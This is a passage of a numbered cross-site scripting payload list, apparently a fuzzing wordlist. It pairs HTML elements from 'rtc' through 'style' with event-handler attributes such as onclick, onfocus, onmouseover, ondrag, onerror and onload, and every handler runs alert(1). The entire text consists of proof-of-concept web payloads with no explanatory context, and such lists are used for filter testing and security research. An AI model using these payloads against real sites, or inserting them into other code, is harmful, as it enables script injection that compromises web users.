3776 | <rtc draggable="true" ondragenter="alert(1)">test</rtc>
3777 | <rtc draggable="true" ondragleave="alert(1)">test</rtc>
3778 | <rtc draggable="true" ondragstart="alert(1)">test</rtc>
3779 | <rtc id=x tabindex=1 onactivate=alert(1)></rtc>
3780 | <rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>
3781 | <rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>
3782 | <rtc id=x tabindex=1 ondeactivate=alert(1)></rtc><input id=y autofocus>
3783 | <rtc id=x tabindex=1 onfocus=alert(1)></rtc>
3784 | <rtc id=x tabindex=1 onfocusin=alert(1)></rtc>
3785 | <rtc onbeforecopy="alert(1)" contenteditable>test</rtc>
3786 | <rtc onbeforecut="alert(1)" contenteditable>test</rtc>
3787 | <rtc onbeforepaste="alert(1)" contenteditable>test</rtc>
3788 | <rtc onblur=alert(1) tabindex=1 id=x></rtc><input autofocus>
3789 | <rtc onclick="alert(1)">test</rtc>
3790 | <rtc oncontextmenu="alert(1)">test</rtc>
3791 | <rtc oncopy="alert(1)" contenteditable>test</rtc>
3792 | <rtc oncut="alert(1)" contenteditable>test</rtc>
3793 | <rtc ondblclick="alert(1)">test</rtc>
3794 | <rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>
3795 | <rtc onkeydown="alert(1)" contenteditable>test</rtc>
3796 | <rtc onkeypress="alert(1)" contenteditable>test</rtc>
3797 | <rtc onkeyup="alert(1)" contenteditable>test</rtc>
3798 | <rtc onmousedown="alert(1)">test</rtc>
3799 | <rtc onmouseenter="alert(1)">test</rtc>
3800 | <rtc onmouseleave="alert(1)">test</rtc>
3801 | <rtc onmousemove="alert(1)">test</rtc>
3802 | <rtc onmouseout="alert(1)">test</rtc>
3803 | <rtc onmouseover="alert(1)">test</rtc>
3804 | <rtc onmouseup="alert(1)">test</rtc>
3805 | <rtc onpaste="alert(1)" contenteditable>test</rtc>
3806 | <ruby draggable="true" ondrag="alert(1)">test</ruby>
3807 | <ruby draggable="true" ondragend="alert(1)">test</ruby>
3808 | <ruby draggable="true" ondragenter="alert(1)">test</ruby>
3809 | <ruby draggable="true" ondragleave="alert(1)">test</ruby>
3810 | <ruby draggable="true" ondragstart="alert(1)">test</ruby>
3811 | <ruby id=x tabindex=1 onactivate=alert(1)></ruby>
3812 | <ruby id=x tabindex=1 onbeforeactivate=alert(1)></ruby>
3813 | <ruby id=x tabindex=1 onbeforedeactivate=alert(1)></ruby><input autofocus>
3814 | <ruby id=x tabindex=1 ondeactivate=alert(1)></ruby><input id=y autofocus>
3815 | <ruby id=x tabindex=1 onfocus=alert(1)></ruby>
3816 | <ruby id=x tabindex=1 onfocusin=alert(1)></ruby>
3817 | <ruby onbeforecopy="alert(1)" contenteditable>test</ruby>
3818 | <ruby onbeforecut="alert(1)" contenteditable>test</ruby>
3819 | <ruby onbeforepaste="alert(1)" contenteditable>test</ruby>
3820 | <ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>
3821 | <ruby onclick="alert(1)">test</ruby>
3822 | <ruby oncontextmenu="alert(1)">test</ruby>
3823 | <ruby oncopy="alert(1)" contenteditable>test</ruby>
3824 | <ruby oncut="alert(1)" contenteditable>test</ruby>
3825 | <ruby ondblclick="alert(1)">test</ruby>
3826 | <ruby onfocusout=alert(1) tabindex=1 id=x></ruby><input autofocus>
3827 | <ruby onkeydown="alert(1)" contenteditable>test</ruby>
3828 | <ruby onkeypress="alert(1)" contenteditable>test</ruby>
3829 | <ruby onkeyup="alert(1)" contenteditable>test</ruby>
3830 | <ruby onmousedown="alert(1)">test</ruby>
3831 | <ruby onmouseenter="alert(1)">test</ruby>
3832 | <ruby onmouseleave="alert(1)">test</ruby>
3833 | <ruby onmousemove="alert(1)">test</ruby>
3834 | <ruby onmouseout="alert(1)">test</ruby>
3835 | <ruby onmouseover="alert(1)">test</ruby>
3836 | <ruby onmouseup="alert(1)">test</ruby>
3837 | <ruby onpaste="alert(1)" contenteditable>test</ruby>
3838 | <s draggable="true" ondrag="alert(1)">test</s>
3839 | <s draggable="true" ondragend="alert(1)">test</s>
3840 | <s draggable="true" ondragenter="alert(1)">test</s>
3841 | <s draggable="true" ondragleave="alert(1)">test</s>
3842 | <s draggable="true" ondragstart="alert(1)">test</s>
3843 | <s id=x tabindex=1 onactivate=alert(1)></s>
3844 | <s id=x tabindex=1 onbeforeactivate=alert(1)></s>
3845 | <s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>
3846 | <s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>
3847 | <s id=x tabindex=1 onfocus=alert(1)></s>
3848 | <s id=x tabindex=1 onfocusin=alert(1)></s>
3849 | <s onbeforecopy="alert(1)" contenteditable>test</s>
3850 | <s onbeforecut="alert(1)" contenteditable>test</s>
3851 | <s onbeforepaste="alert(1)" contenteditable>test</s>
3852 | <s onblur=alert(1) tabindex=1 id=x></s><input autofocus>
3853 | <s onclick="alert(1)">test</s>
3854 | <s oncontextmenu="alert(1)">test</s>
3855 | <s oncopy="alert(1)" contenteditable>test</s>
3856 | <s oncut="alert(1)" contenteditable>test</s>
3857 | <s ondblclick="alert(1)">test</s>
3858 | <s onfocusout=alert(1) tabindex=1 id=x></s><input autofocus>
3859 | <s onkeydown="alert(1)" contenteditable>test</s>
3860 | <s onkeypress="alert(1)" contenteditable>test</s>
3861 | <s onkeyup="alert(1)" contenteditable>test</s>
3862 | <s onmousedown="alert(1)">test</s>
3863 | <s onmouseenter="alert(1)">test</s>
3864 | <s onmouseleave="alert(1)">test</s>
3865 | <s onmousemove="alert(1)">test</s>
3866 | <s onmouseout="alert(1)">test</s>
3867 | <s onmouseover="alert(1)">test</s>
3868 | <s onmouseup="alert(1)">test</s>
3869 | <s onpaste="alert(1)" contenteditable>test</s>
3870 | <samp draggable="true" ondrag="alert(1)">test</samp>
3871 | <samp draggable="true" ondragend="alert(1)">test</samp>
3872 | <samp draggable="true" ondragenter="alert(1)">test</samp>
3873 | <samp draggable="true" ondragleave="alert(1)">test</samp>
3874 | <samp draggable="true" ondragstart="alert(1)">test</samp>
3875 | <samp id=x tabindex=1 onactivate=alert(1)></samp>
3876 | <samp id=x tabindex=1 onbeforeactivate=alert(1)></samp>
3877 | <samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>
3878 | <samp id=x tabindex=1 ondeactivate=alert(1)></samp><input id=y autofocus>
3879 | <samp id=x tabindex=1 onfocus=alert(1)></samp>
3880 | <samp id=x tabindex=1 onfocusin=alert(1)></samp>
3881 | <samp onbeforecopy="alert(1)" contenteditable>test</samp>
3882 | <samp onbeforecut="alert(1)" contenteditable>test</samp>
3883 | <samp onbeforepaste="alert(1)" contenteditable>test</samp>
3884 | <samp onblur=alert(1) tabindex=1 id=x></samp><input autofocus>
3885 | <samp onclick="alert(1)">test</samp>
3886 | <samp oncontextmenu="alert(1)">test</samp>
3887 | <samp oncopy="alert(1)" contenteditable>test</samp>
3888 | <samp oncut="alert(1)" contenteditable>test</samp>
3889 | <samp ondblclick="alert(1)">test</samp>
3890 | <samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>
3891 | <samp onkeydown="alert(1)" contenteditable>test</samp>
3892 | <samp onkeypress="alert(1)" contenteditable>test</samp>
3893 | <samp onkeyup="alert(1)" contenteditable>test</samp>
3894 | <samp onmousedown="alert(1)">test</samp>
3895 | <samp onmouseenter="alert(1)">test</samp>
3896 | <samp onmouseleave="alert(1)">test</samp>
3897 | <samp onmousemove="alert(1)">test</samp>
3898 | <samp onmouseout="alert(1)">test</samp>
3899 | <samp onmouseover="alert(1)">test</samp>
3900 | <samp onmouseup="alert(1)">test</samp>
3901 | <samp onpaste="alert(1)" contenteditable>test</samp>
3902 | <script draggable="true" ondrag="alert(1)">test</script>
3903 | <script draggable="true" ondragend="alert(1)">test</script>
3904 | <script draggable="true" ondragenter="alert(1)">test</script>
3905 | <script draggable="true" ondragleave="alert(1)">test</script>
3906 | <script draggable="true" ondragstart="alert(1)">test</script>
3907 | <script id=x tabindex=1 onactivate=alert(1)></script>
3908 | <script id=x tabindex=1 onbeforeactivate=alert(1)></script>
3909 | <script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>
3910 | <script id=x tabindex=1 ondeactivate=alert(1)></script><input id=y autofocus>
3911 | <script id=x tabindex=1 onfocus=alert(1)></script>
3912 | <script id=x tabindex=1 onfocusin=alert(1)></script>
3913 | <script onbeforecopy="alert(1)" contenteditable>test</script>
3914 | <script onbeforecut="alert(1)" contenteditable>test</script>
3915 | <script onbeforepaste="alert(1)" contenteditable>test</script>
3916 | <script onblur=alert(1) tabindex=1 id=x></script><input autofocus>
3917 | <script onclick="alert(1)">test</script>
3918 | <script oncontextmenu="alert(1)">test</script>
3919 | <script oncopy="alert(1)" contenteditable>test</script>
3920 | <script oncut="alert(1)" contenteditable>test</script>
3921 | <script ondblclick="alert(1)">test</script>
3922 | <script onerror=alert(1) src=/></script>
3923 | <script onfocusout=alert(1) tabindex=1 id=x></script><input autofocus>
3924 | <script onkeydown="alert(1)" contenteditable>test</script>
3925 | <script onkeypress="alert(1)" contenteditable>test</script>
3926 | <script onkeyup="alert(1)" contenteditable>test</script>
3927 | <script onload=alert(1) src=validjs.js></script>
3928 | <script onmousedown="alert(1)">test</script>
3929 | <script onmouseenter="alert(1)">test</script>
3930 | <script onmouseleave="alert(1)">test</script>
3931 | <script onmousemove="alert(1)">test</script>
3932 | <script onmouseout="alert(1)">test</script>
3933 | <script onmouseover="alert(1)">test</script>
3934 | <script onmouseup="alert(1)">test</script>
3935 | <script onpaste="alert(1)" contenteditable>test</script>
3936 | <script onreadystatechange=alert(1)></script>
3937 | <section draggable="true" ondrag="alert(1)">test</section>
3938 | <section draggable="true" ondragend="alert(1)">test</section>
3939 | <section draggable="true" ondragenter="alert(1)">test</section>
3940 | <section draggable="true" ondragleave="alert(1)">test</section>
3941 | <section draggable="true" ondragstart="alert(1)">test</section>
3942 | <section id=x tabindex=1 onactivate=alert(1)></section>
3943 | <section id=x tabindex=1 onbeforeactivate=alert(1)></section>
3944 | <section id=x tabindex=1 onbeforedeactivate=alert(1)></section><input autofocus>
3945 | <section id=x tabindex=1 ondeactivate=alert(1)></section><input id=y autofocus>
3946 | <section id=x tabindex=1 onfocus=alert(1)></section>
3947 | <section id=x tabindex=1 onfocusin=alert(1)></section>
3948 | <section onbeforecopy="alert(1)" contenteditable>test</section>
3949 | <section onbeforecut="alert(1)" contenteditable>test</section>
3950 | <section onbeforepaste="alert(1)" contenteditable>test</section>
3951 | <section onblur=alert(1) tabindex=1 id=x></section><input autofocus>
3952 | <section onclick="alert(1)">test</section>
3953 | <section oncontextmenu="alert(1)">test</section>
3954 | <section oncopy="alert(1)" contenteditable>test</section>
3955 | <section oncut="alert(1)" contenteditable>test</section>
3956 | <section ondblclick="alert(1)">test</section>
3957 | <section onfocusout=alert(1) tabindex=1 id=x></section><input autofocus>
3958 | <section onkeydown="alert(1)" contenteditable>test</section>
3959 | <section onkeypress="alert(1)" contenteditable>test</section>
3960 | <section onkeyup="alert(1)" contenteditable>test</section>
3961 | <section onmousedown="alert(1)">test</section>
3962 | <section onmouseenter="alert(1)">test</section>
3963 | <section onmouseleave="alert(1)">test</section>
3964 | <section onmousemove="alert(1)">test</section>
3965 | <section onmouseout="alert(1)">test</section>
3966 | <section onmouseover="alert(1)">test</section>
3967 | <section onmouseup="alert(1)">test</section>
3968 | <section onpaste="alert(1)" contenteditable>test</section>
3969 | <select autofocus onfocus=alert(1)>
3970 | <select autofocus onfocusin=alert(1)>
3971 | <select draggable="true" ondrag="alert(1)">test</select>
3972 | <select draggable="true" ondragend="alert(1)">test</select>
3973 | <select draggable="true" ondragenter="alert(1)">test</select>
3974 | <select draggable="true" ondragleave="alert(1)">test</select>
3975 | <select draggable="true" ondragstart="alert(1)">test</select>
3976 | <select id=x tabindex=1 onactivate=alert(1)></select>
3977 | <select id=x tabindex=1 onbeforeactivate=alert(1)></select>
3978 | <select id=x tabindex=1 onbeforedeactivate=alert(1)></select><input autofocus>
3979 | <select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>
3980 | <select onbeforecopy="alert(1)" contenteditable>test</select>
3981 | <select onbeforecut="alert(1)" contenteditable>test</select>
3982 | <select onbeforepaste="alert(1)" contenteditable>test</select>
3983 | <select onblur=alert(1) id=x></select><input autofocus>
3984 | <select onchange=alert(1)><option>change me</option><option>XSS</option></select>
3985 | <select onclick="alert(1)">test</select>
3986 | <select oncontextmenu="alert(1)">test</select>
3987 | <select oncopy="alert(1)" contenteditable>test</select>
3988 | <select oncut="alert(1)" contenteditable>test</select>
3989 | <select ondblclick="alert(1)">test</select>
3990 | <select onfocusout=alert(1) id=x></select><input autofocus>
3991 | <select onkeydown="alert(1)" contenteditable>test</select>
3992 | <select onkeypress="alert(1)" contenteditable>test</select>
3993 | <select onkeyup="alert(1)" contenteditable>test</select>
3994 | <select onmousedown="alert(1)">test</select>
3995 | <select onmouseenter="alert(1)">test</select>
3996 | <select onmouseleave="alert(1)">test</select>
3997 | <select onmousemove="alert(1)">test</select>
3998 | <select onmouseout="alert(1)">test</select>
3999 | <select onmouseover="alert(1)">test</select>
4000 | <select onmouseup="alert(1)">test</select>
4001 | <select onpaste="alert(1)" contenteditable>test</select>
4002 | <shadow draggable="true" ondrag="alert(1)">test</shadow>
4003 | <shadow draggable="true" ondragend="alert(1)">test</shadow>
4004 | <shadow draggable="true" ondragenter="alert(1)">test</shadow>
4005 | <shadow draggable="true" ondragleave="alert(1)">test</shadow>
4006 | <shadow draggable="true" ondragstart="alert(1)">test</shadow>
4007 | <shadow id=x tabindex=1 onactivate=alert(1)></shadow>
4008 | <shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>
4009 | <shadow id=x tabindex=1 onbeforedeactivate=alert(1)></shadow><input autofocus>
4010 | <shadow id=x tabindex=1 ondeactivate=alert(1)></shadow><input id=y autofocus>
4011 | <shadow id=x tabindex=1 onfocus=alert(1)></shadow>
4012 | <shadow id=x tabindex=1 onfocusin=alert(1)></shadow>
4013 | <shadow onbeforecopy="alert(1)" contenteditable>test</shadow>
4014 | <shadow onbeforecut="alert(1)" contenteditable>test</shadow>
4015 | <shadow onbeforepaste="alert(1)" contenteditable>test</shadow>
4016 | <shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>
4017 | <shadow onclick="alert(1)">test</shadow>
4018 | <shadow oncontextmenu="alert(1)">test</shadow>
4019 | <shadow oncopy="alert(1)" contenteditable>test</shadow>
4020 | <shadow oncut="alert(1)" contenteditable>test</shadow>
4021 | <shadow ondblclick="alert(1)">test</shadow>
4022 | <shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>
4023 | <shadow onkeydown="alert(1)" contenteditable>test</shadow>
4024 | <shadow onkeypress="alert(1)" contenteditable>test</shadow>
4025 | <shadow onkeyup="alert(1)" contenteditable>test</shadow>
4026 | <shadow onmousedown="alert(1)">test</shadow>
4027 | <shadow onmouseenter="alert(1)">test</shadow>
4028 | <shadow onmouseleave="alert(1)">test</shadow>
4029 | <shadow onmousemove="alert(1)">test</shadow>
4030 | <shadow onmouseout="alert(1)">test</shadow>
4031 | <shadow onmouseover="alert(1)">test</shadow>
4032 | <shadow onmouseup="alert(1)">test</shadow>
4033 | <shadow onpaste="alert(1)" contenteditable>test</shadow>
4034 | <slot draggable="true" ondrag="alert(1)">test</slot>
4035 | <slot draggable="true" ondragend="alert(1)">test</slot>
4036 | <slot draggable="true" ondragenter="alert(1)">test</slot>
4037 | <slot draggable="true" ondragleave="alert(1)">test</slot>
4038 | <slot draggable="true" ondragstart="alert(1)">test</slot>
4039 | <slot id=x tabindex=1 onactivate=alert(1)></slot>
4040 | <slot id=x tabindex=1 onbeforeactivate=alert(1)></slot>
4041 | <slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>
4042 | <slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>
4043 | <slot id=x tabindex=1 onfocus=alert(1)></slot>
4044 | <slot id=x tabindex=1 onfocusin=alert(1)></slot>
4045 | <slot onbeforecopy="alert(1)" contenteditable>test</slot>
4046 | <slot onbeforecut="alert(1)" contenteditable>test</slot>
4047 | <slot onbeforepaste="alert(1)" contenteditable>test</slot>
4048 | <slot onblur=alert(1) tabindex=1 id=x></slot><input autofocus>
4049 | <slot onclick="alert(1)">test</slot>
4050 | <slot oncontextmenu="alert(1)">test</slot>
4051 | <slot oncopy="alert(1)" contenteditable>test</slot>
4052 | <slot oncut="alert(1)" contenteditable>test</slot>
4053 | <slot ondblclick="alert(1)">test</slot>
4054 | <slot onfocusout=alert(1) tabindex=1 id=x></slot><input autofocus>
4055 | <slot onkeydown="alert(1)" contenteditable>test</slot>
4056 | <slot onkeypress="alert(1)" contenteditable>test</slot>
4057 | <slot onkeyup="alert(1)" contenteditable>test</slot>
4058 | <slot onmousedown="alert(1)">test</slot>
4059 | <slot onmouseenter="alert(1)">test</slot>
4060 | <slot onmouseleave="alert(1)">test</slot>
4061 | <slot onmousemove="alert(1)">test</slot>
4062 | <slot onmouseout="alert(1)">test</slot>
4063 | <slot onmouseover="alert(1)">test</slot>
4064 | <slot onmouseup="alert(1)">test</slot>
4065 | <slot onpaste="alert(1)" contenteditable>test</slot>
4066 | <small draggable="true" ondrag="alert(1)">test</small>
4067 | <small draggable="true" ondragend="alert(1)">test</small>
4068 | <small draggable="true" ondragenter="alert(1)">test</small>
4069 | <small draggable="true" ondragleave="alert(1)">test</small>
4070 | <small draggable="true" ondragstart="alert(1)">test</small>
4071 | <small id=x tabindex=1 onactivate=alert(1)></small>
4072 | <small id=x tabindex=1 onbeforeactivate=alert(1)></small>
4073 | <small id=x tabindex=1 onbeforedeactivate=alert(1)></small><input autofocus>
4074 | <small id=x tabindex=1 ondeactivate=alert(1)></small><input id=y autofocus>
4075 | <small id=x tabindex=1 onfocus=alert(1)></small>
4076 | <small id=x tabindex=1 onfocusin=alert(1)></small>
4077 | <small onbeforecopy="alert(1)" contenteditable>test</small>
4078 | <small onbeforecut="alert(1)" contenteditable>test</small>
4079 | <small onbeforepaste="alert(1)" contenteditable>test</small>
4080 | <small onblur=alert(1) tabindex=1 id=x></small><input autofocus>
4081 | <small onclick="alert(1)">test</small>
4082 | <small oncontextmenu="alert(1)">test</small>
4083 | <small oncopy="alert(1)" contenteditable>test</small>
4084 | <small oncut="alert(1)" contenteditable>test</small>
4085 | <small ondblclick="alert(1)">test</small>
4086 | <small onfocusout=alert(1) tabindex=1 id=x></small><input autofocus>
4087 | <small onkeydown="alert(1)" contenteditable>test</small>
4088 | <small onkeypress="alert(1)" contenteditable>test</small>
4089 | <small onkeyup="alert(1)" contenteditable>test</small>
4090 | <small onmousedown="alert(1)">test</small>
4091 | <small onmouseenter="alert(1)">test</small>
4092 | <small onmouseleave="alert(1)">test</small>
4093 | <small onmousemove="alert(1)">test</small>
4094 | <small onmouseout="alert(1)">test</small>
4095 | <small onmouseover="alert(1)">test</small>
4096 | <small onmouseup="alert(1)">test</small>
4097 | <small onpaste="alert(1)" contenteditable>test</small>
4098 | <source draggable="true" ondrag="alert(1)">test</source>
4099 | <source draggable="true" ondragend="alert(1)">test</source>
4100 | <source draggable="true" ondragenter="alert(1)">test</source>
4101 | <source draggable="true" ondragleave="alert(1)">test</source>
4102 | <source draggable="true" ondragstart="alert(1)">test</source>
4103 | <source id=x tabindex=1 onactivate=alert(1)></source>
4104 | <source id=x tabindex=1 onbeforeactivate=alert(1)></source>
4105 | <source id=x tabindex=1 onbeforedeactivate=alert(1)></source><input autofocus>
4106 | <source id=x tabindex=1 ondeactivate=alert(1)></source><input id=y autofocus>
4107 | <source id=x tabindex=1 onfocus=alert(1)></source>
4108 | <source id=x tabindex=1 onfocusin=alert(1)></source>
4109 | <source onbeforecopy="alert(1)" contenteditable>test</source>
4110 | <source onbeforecut="alert(1)" contenteditable>test</source>
4111 | <source onbeforepaste="alert(1)" contenteditable>test</source>
4112 | <source onblur=alert(1) tabindex=1 id=x></source><input autofocus>
4113 | <source onclick="alert(1)">test</source>
4114 | <source oncontextmenu="alert(1)">test</source>
4115 | <source oncopy="alert(1)" contenteditable>test</source>
4116 | <source oncut="alert(1)" contenteditable>test</source>
4117 | <source ondblclick="alert(1)">test</source>
4118 | <source onfocusout=alert(1) tabindex=1 id=x></source><input autofocus>
4119 | <source onkeydown="alert(1)" contenteditable>test</source>
4120 | <source onkeypress="alert(1)" contenteditable>test</source>
4121 | <source onkeyup="alert(1)" contenteditable>test</source>
4122 | <source onmousedown="alert(1)">test</source>
4123 | <source onmouseenter="alert(1)">test</source>
4124 | <source onmouseleave="alert(1)">test</source>
4125 | <source onmousemove="alert(1)">test</source>
4126 | <source onmouseout="alert(1)">test</source>
4127 | <source onmouseover="alert(1)">test</source>
4128 | <source onmouseup="alert(1)">test</source>
4129 | <source onpaste="alert(1)" contenteditable>test</source>
4130 | <spacer draggable="true" ondrag="alert(1)">test</spacer>
4131 | <spacer draggable="true" ondragend="alert(1)">test</spacer>
4132 | <spacer draggable="true" ondragenter="alert(1)">test</spacer>
4133 | <spacer draggable="true" ondragleave="alert(1)">test</spacer>
4134 | <spacer draggable="true" ondragstart="alert(1)">test</spacer>
4135 | <spacer id=x tabindex=1 onactivate=alert(1)></spacer>
4136 | <spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>
4137 | <spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>
4138 | <spacer id=x tabindex=1 ondeactivate=alert(1)></spacer><input id=y autofocus>
4139 | <spacer id=x tabindex=1 onfocus=alert(1)></spacer>
4140 | <spacer id=x tabindex=1 onfocusin=alert(1)></spacer>
4141 | <spacer onbeforecopy="alert(1)" contenteditable>test</spacer>
4142 | <spacer onbeforecut="alert(1)" contenteditable>test</spacer>
4143 | <spacer onbeforepaste="alert(1)" contenteditable>test</spacer>
4144 | <spacer onblur=alert(1) tabindex=1 id=x></spacer><input autofocus>
4145 | <spacer onclick="alert(1)">test</spacer>
4146 | <spacer oncontextmenu="alert(1)">test</spacer>
4147 | <spacer oncopy="alert(1)" contenteditable>test</spacer>
4148 | <spacer oncut="alert(1)" contenteditable>test</spacer>
4149 | <spacer ondblclick="alert(1)">test</spacer>
4150 | <spacer onfocusout=alert(1) tabindex=1 id=x></spacer><input autofocus>
4151 | <spacer onkeydown="alert(1)" contenteditable>test</spacer>
4152 | <spacer onkeypress="alert(1)" contenteditable>test</spacer>
4153 | <spacer onkeyup="alert(1)" contenteditable>test</spacer>
4154 | <spacer onmousedown="alert(1)">test</spacer>
4155 | <spacer onmouseenter="alert(1)">test</spacer>
4156 | <spacer onmouseleave="alert(1)">test</spacer>
4157 | <spacer onmousemove="alert(1)">test</spacer>
4158 | <spacer onmouseout="alert(1)">test</spacer>
4159 | <spacer onmouseover="alert(1)">test</spacer>
4160 | <spacer onmouseup="alert(1)">test</spacer>
4161 | <spacer onpaste="alert(1)" contenteditable>test</spacer>
4162 | <span draggable="true" ondrag="alert(1)">test</span>
4163 | <span draggable="true" ondragend="alert(1)">test</span>
4164 | <span draggable="true" ondragenter="alert(1)">test</span>
4165 | <span draggable="true" ondragleave="alert(1)">test</span>
4166 | <span draggable="true" ondragstart="alert(1)">test</span>
4167 | <span id=x tabindex=1 onactivate=alert(1)></span>
4168 | <span id=x tabindex=1 onbeforeactivate=alert(1)></span>
4169 | <span id=x tabindex=1 onbeforedeactivate=alert(1)></span><input autofocus>
4170 | <span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>
4171 | <span id=x tabindex=1 onfocus=alert(1)></span>
4172 | <span id=x tabindex=1 onfocusin=alert(1)></span>
4173 | <span onbeforecopy="alert(1)" contenteditable>test</span>
4174 | <span onbeforecut="alert(1)" contenteditable>test</span>
4175 | <span onbeforepaste="alert(1)" contenteditable>test</span>
4176 | <span onblur=alert(1) tabindex=1 id=x></span><input autofocus>
4177 | <span onclick="alert(1)">test</span>
4178 | <span oncontextmenu="alert(1)">test</span>
4179 | <span oncopy="alert(1)" contenteditable>test</span>
4180 | <span oncut="alert(1)" contenteditable>test</span>
4181 | <span ondblclick="alert(1)">test</span>
4182 | <span onfocusout=alert(1) tabindex=1 id=x></span><input autofocus>
4183 | <span onkeydown="alert(1)" contenteditable>test</span>
4184 | <span onkeypress="alert(1)" contenteditable>test</span>
4185 | <span onkeyup="alert(1)" contenteditable>test</span>
4186 | <span onmousedown="alert(1)">test</span>
4187 | <span onmouseenter="alert(1)">test</span>
4188 | <span onmouseleave="alert(1)">test</span>
4189 | <span onmousemove="alert(1)">test</span>
4190 | <span onmouseout="alert(1)">test</span>
4191 | <span onmouseover="alert(1)">test</span>
4192 | <span onmouseup="alert(1)">test</span>
4193 | <span onpaste="alert(1)" contenteditable>test</span>
4194 | <strike draggable="true" ondrag="alert(1)">test</strike>
4195 | <strike draggable="true" ondragend="alert(1)">test</strike>
4196 | <strike draggable="true" ondragenter="alert(1)">test</strike>
4197 | <strike draggable="true" ondragleave="alert(1)">test</strike>
4198 | <strike draggable="true" ondragstart="alert(1)">test</strike>
4199 | <strike id=x tabindex=1 onactivate=alert(1)></strike>
4200 | <strike id=x tabindex=1 onbeforeactivate=alert(1)></strike>
4201 | <strike id=x tabindex=1 onbeforedeactivate=alert(1)></strike><input autofocus>
4202 | <strike id=x tabindex=1 ondeactivate=alert(1)></strike><input id=y autofocus>
4203 | <strike id=x tabindex=1 onfocus=alert(1)></strike>
4204 | <strike id=x tabindex=1 onfocusin=alert(1)></strike>
4205 | <strike onbeforecopy="alert(1)" contenteditable>test</strike>
4206 | <strike onbeforecut="alert(1)" contenteditable>test</strike>
4207 | <strike onbeforepaste="alert(1)" contenteditable>test</strike>
4208 | <strike onblur=alert(1) tabindex=1 id=x></strike><input autofocus>
4209 | <strike onclick="alert(1)">test</strike>
4210 | <strike oncontextmenu="alert(1)">test</strike>
4211 | <strike oncopy="alert(1)" contenteditable>test</strike>
4212 | <strike oncut="alert(1)" contenteditable>test</strike>
4213 | <strike ondblclick="alert(1)">test</strike>
4214 | <strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>
4215 | <strike onkeydown="alert(1)" contenteditable>test</strike>
4216 | <strike onkeypress="alert(1)" contenteditable>test</strike>
4217 | <strike onkeyup="alert(1)" contenteditable>test</strike>
4218 | <strike onmousedown="alert(1)">test</strike>
4219 | <strike onmouseenter="alert(1)">test</strike>
4220 | <strike onmouseleave="alert(1)">test</strike>
4221 | <strike onmousemove="alert(1)">test</strike>
4222 | <strike onmouseout="alert(1)">test</strike>
4223 | <strike onmouseover="alert(1)">test</strike>
4224 | <strike onmouseup="alert(1)">test</strike>
4225 | <strike onpaste="alert(1)" contenteditable>test</strike>
4226 | <strong draggable="true" ondrag="alert(1)">test</strong>
4227 | <strong draggable="true" ondragend="alert(1)">test</strong>
4228 | <strong draggable="true" ondragenter="alert(1)">test</strong>
4229 | <strong draggable="true" ondragleave="alert(1)">test</strong>
4230 | <strong draggable="true" ondragstart="alert(1)">test</strong>
4231 | <strong id=x tabindex=1 onactivate=alert(1)></strong>
4232 | <strong id=x tabindex=1 onbeforeactivate=alert(1)></strong>
4233 | <strong id=x tabindex=1 onbeforedeactivate=alert(1)></strong><input autofocus>
4234 | <strong id=x tabindex=1 ondeactivate=alert(1)></strong><input id=y autofocus>
4235 | <strong id=x tabindex=1 onfocus=alert(1)></strong>
4236 | <strong id=x tabindex=1 onfocusin=alert(1)></strong>
4237 | <strong onbeforecopy="alert(1)" contenteditable>test</strong>
4238 | <strong onbeforecut="alert(1)" contenteditable>test</strong>
4239 | <strong onbeforepaste="alert(1)" contenteditable>test</strong>
4240 | <strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>
4241 | <strong onclick="alert(1)">test</strong>
4242 | <strong oncontextmenu="alert(1)">test</strong>
4243 | <strong oncopy="alert(1)" contenteditable>test</strong>
4244 | <strong oncut="alert(1)" contenteditable>test</strong>
4245 | <strong ondblclick="alert(1)">test</strong>
4246 | <strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>
4247 | <strong onkeydown="alert(1)" contenteditable>test</strong>
4248 | <strong onkeypress="alert(1)" contenteditable>test</strong>
4249 | <strong onkeyup="alert(1)" contenteditable>test</strong>
4250 | <strong onmousedown="alert(1)">test</strong>
4251 | <strong onmouseenter="alert(1)">test</strong>
4252 | <strong onmouseleave="alert(1)">test</strong>
4253 | <strong onmousemove="alert(1)">test</strong>
4254 | <strong onmouseout="alert(1)">test</strong>
4255 | <strong onmouseover="alert(1)">test</strong>
4256 | <strong onmouseup="alert(1)">test</strong>
4257 | <strong onpaste="alert(1)" contenteditable>test</strong>
4258 | <style draggable="true" ondrag="alert(1)">test</style>
4259 | <style draggable="true" ondragend="alert(1)">test</style>
4260 | <style draggable="true" ondragenter="alert(1)">test</style>
4261 | <style draggable="true" ondragleave="alert(1)">test</style>
4262 | <style draggable="true" ondragstart="alert(1)">test</style>
4263 | <style id=x tabindex=1 onactivate=alert(1)></style>
4264 | <style id=x tabindex=1 onbeforeactivate=alert(1)></style>
4265 | <style id=x tabindex=1 onbeforedeactivate=alert(1)></style><input autofocus>
4266 | <style id=x tabindex=1 ondeactivate=alert(1)></style><input id=y autofocus>
4267 | <style id=x tabindex=1 onfocus=alert(1)></style>
4268 | <style id=x tabindex=1 onfocusin=alert(1)></style>
4269 | <style onbeforecopy="alert(1)" contenteditable>test</style>
4270 | <style onbeforecut="alert(1)" contenteditable>test</style>
4271 | <style onbeforepaste="alert(1)" contenteditable>test</style>
4272 | <style onblur=alert(1) tabindex=1 id=x></style><input autofocus>
